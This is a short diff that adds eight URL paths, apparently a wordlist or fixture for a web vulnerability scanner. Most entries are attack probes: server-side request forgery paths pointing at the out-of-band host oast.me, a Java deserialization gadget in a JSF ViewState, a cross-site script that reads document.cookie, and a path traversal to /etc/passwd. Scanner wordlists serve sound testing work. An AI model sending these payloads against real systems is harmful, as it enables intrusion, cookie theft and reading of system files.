@@ -1,0 +1,8 @@
+/os/mxperson
+/meaweb/os/mxperson
+/docpicker/internal_proxy/http/oast.me
+/wps/PA_WCM_Authoring_UI/proxy/http/oast.me
+/res/login.jsf?javax.faces.ViewState={{generate_java_gadget(
+/data/login
+/help/index.jsp?view=%3Cscript%3Ealert(document.cookie)%3C/script%3E
+/./../../../../../../../../../../etc/passwd
